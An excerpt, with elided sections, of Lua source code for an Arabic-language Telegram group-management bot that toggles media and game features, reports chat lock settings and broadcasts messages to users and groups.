DevRio:set(Latvia..'Rio:Age:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Latvia..'Rio:Age:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Mean:Rio'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل معاني الاسماء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Mean:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Latvia..'Rio:Mean:Rio'..msg.chat_id_) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:gif:Rio'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:gif:Rio'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevRio:get(Latvia..'Rio:gif:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:memz:Rio'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:memz:Rio'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevRio:get(Latvia..'Rio:memz:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Audios:Rio'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Audios:Rio'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevRio:get(Latvia..'Rio:Audios:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:mp3:Rio'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:mp3:Rio'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevRio:get(Latvia..'Rio:mp3:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Remix:Rio'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Remix:Rio'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevRio:get(Latvia..'Rio:Remix:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Photo:Rio'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Photo:Rio'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevRio:get(Latvia..'Rio:Photo:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Anime:Rio'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Anime:Rio'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevRio:get(Latvia..'Rio:Anime:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Movies:Rio'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Movies:Rio'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevRio:get(Latvia..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Series:Rio'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Series:Rio'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevRio:get(Latvia..'Rio:Series:Rio'..msg.chat_id_) and ChCheck(msg) then
...
--     Source Latvia     --
if Admin(msg) then
if DevRio:get(Latvia..'Rio:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevRio:get(Latvia..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الروابط ↫ "..mute_links.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevRio:get(Latvia..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙المعرف ↫ "..lock_tag.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevRio:get(Latvia..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙المتحركه ↫ "..mute_gifs.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الملصقات" then if DevRio:get(Latvia..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الملصقات ↫ "..lock_sticker.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الصور" then if DevRio:get(Latvia..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الصور ↫ "..mute_photo.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevRio:get(Latvia..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الفيديو ↫ "..mute_video.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الاونلاين" then if DevRio:get(Latvia..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local LatviaTeam = "\n" .."᥀︙الاونلاين ↫ "..mute_in.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الدردشه" then if DevRio:get(Latvia..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الدردشه ↫ "..mute_text.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevRio:get(Latvia..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local LatviaTeam = "\n" .."᥀︙التوجيه ↫ "..lock_forward.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الاغاني" then if DevRio:get(Latvia..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الاغاني ↫ "..mute_music.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevRio:get(Latvia..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local LatviaTeam = "\n" .."᥀︙الصوت ↫ "..mute_voice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevRio:get(Latvia..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الجهات ↫ "..lock_contact.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الماركداون" then if DevRio:get(Latvia..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local LatviaTeam = "\n" .."᥀︙الماركداون ↫ "..markdown.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الهاشتاك" then if DevRio:get(Latvia..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local LatviaTeam = "\n" .."᥀︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "التعديل" then if DevRio:get(Latvia..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local LatviaTeam = "\n" .."᥀︙التعديل ↫ "..mute_edit.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "التثبيت" then if DevRio:get(Latvia..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local LatviaTeam = "\n" .."᥀︙التثبيت ↫ "..lock_pin.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الاشعارات" then if DevRio:get(Latvia..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الكلايش" then if DevRio:get(Latvia..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الكلايش ↫ "..lock_spam.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الدخول" then if DevRio:get(Latvia..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local LatviaTeam = "\n" .."᥀︙الدخول ↫ "..lock_Join.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الشبكات" then if DevRio:get(Latvia..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الشبكات ↫ "..lock_wp.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "المواقع" then if DevRio:get(Latvia..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙المواقع ↫ "..lock_location.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "العربيه" then if DevRio:get(Latvia..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙العربيه ↫ "..lock_arabic.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الانكليزيه" then if DevRio:get(Latvia..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local LatviaTeam = "\n" .."᥀︙الانكليزيه ↫ "..lock_english.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الكفر" then if DevRio:get(Latvia..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local LatviaTeam = "\n" .."᥀︙الكفر ↫ "..lock_kaf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الفشار" then if DevRio:get(Latvia..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local LatviaTeam = "\n" .."᥀︙الفشار ↫ "..lock_fshar.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
if text == "الطائفيه" then if DevRio:get(Latvia..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local LatviaTeam = "\n" .."᥀︙الطائفيه ↫ "..lock_taf.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, LatviaTeam, 1, 'md') end
end
--     Source Latvia     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل كشف الاعدادات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:LockSettings'..msg.chat_id_) 
end
--     Source Latvia     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:Robot'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:Robot'..msg.chat_id_,true)
end
--     Source Latvia     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المدير'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:GpRed'..msg.chat_id_,true)
end
--     Source Latvia     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ردود المطور'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:AllRed'..msg.chat_id_,true)
end
--     Source Latvia     --
if RioSudo(msg) then
...
--     Source Latvia     --
if msg.content_.photo_ then
if DevRio:get(Latvia..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevRio:del(Latvia..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"᥀︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevRio:del(Latvia..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevRio:set(Latvia..'Rio:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source Latvia     --
...
if data.ID == "Ok" then
DevRio:del(Latvia..'Rio:PinnedMsg'..msg.chat_id_)
...
local PinId = DevRio:get(Latvia..'Rio:PinnedMsg'..msg.chat_id_)
if PinId then
...
DevRio:del(Latvia..'Rio:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevRio:scard(Latvia.."Rio:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevRio:scard(Latvia.."Rio:Constructor:"..ChatId) or 0
local BanedList = DevRio:scard(Latvia.."Rio:Ban:"..ChatId) or 0
local ManagerList = DevRio:scard(Latvia.."Rio:Managers:"..ChatId) or 0
local MutedList = DevRio:scard(Latvia.."Rio:Muted:"..ChatId) or 0
local TkeedList = DevRio:scard(Latvia.."Rio:Rio:Tkeed:"..ChatId) or 0
local AdminsList = DevRio:scard(Latvia.."Rio:Admins:"..ChatId) or 0
local VipList = DevRio:scard(Latvia.."Rio:VipMem:"..ChatId) or 0
...
ConstructorRio = "["..Rio.first_name_.."](T.me/"..(Rio.username_ or "latviateam")..")"
else 
...
DevRio:srem(Latvia.."Rio:Groups", dp.id_)
else
...
DevRio:set(Latvia..'Rio:Num:Add:Bot',Num) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:FreeBot'..Latvia) 
end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:FreeBot'..Latvia,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل صورتي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:Games'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia.."Rio:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia.."Rio:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia.."Rio:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:Lock:Key"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia.."Rio:Lock:Key"..msg.chat_id_)
return false  
end
end
--     Source Latvia     --
...
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(Latvia.."Rio:Groups",msg.chat_id_)
if not DevRio:get(Latvia..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevRio:incrby(Latvia..'Rio:Sudos'..msg.sender_user_id_,1)
DevRio:set(Latvia..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_,"rio")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevRio:sismember(Latvia..'Rio:Groups',msg.chat_id_) then
...
for k,v in pairs(List) do
local GroupsManagers = DevRio:scard(Latvia.."Rio:Managers:"..v) or 0
local GroupsAdmins = DevRio:scard(Latvia.."Rio:Admins:"..v) or 0
local Groupslink = DevRio:get(Latvia.."Rio:Groups:Links" ..v)
...
DevRio:setex(Latvia.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Latvia.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(Latvia.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(Latvia..'Rio:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
...
DevRio:setex(Latvia.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(Latvia.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
